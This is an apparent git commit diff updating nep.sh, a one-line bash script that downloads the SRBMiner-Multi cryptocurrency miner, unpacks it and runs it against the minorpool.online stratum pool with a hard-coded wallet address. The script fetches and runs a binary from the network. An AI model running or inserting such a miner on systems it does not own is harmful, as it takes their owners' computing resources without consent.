2e284b42fd57d45a46c0402225af34386b5049fd
barburonjilo <barburonjilo@outlook.co.id>
2025-01-14 11:19:54 +0700

    Update nep.sh

--- nep.sh
+++ nep.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.xz && rm SRBMiner-Multi-2-4-7-Linux.tar.xz && cd SRBMiner-Multi-2-4-7 && ./SRBMiner-MULTI -a ghostrider -o stratum+tcp://minorpool.online:3514 -u GSHaibtcScFXmv2keXRoa92gsumgwAAk6u.1 -p x
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz && rm SRBMiner-Multi-2-7-5-Linux.tar.gz && cd SRBMiner-Multi-2-7-5 && ./SRBMiner-MULTI -a ghostrider -o stratum+tcp://minorpool.online:3514 -u GSHaibtcScFXmv2keXRoa92gsumgwAAk6u.1 -p x
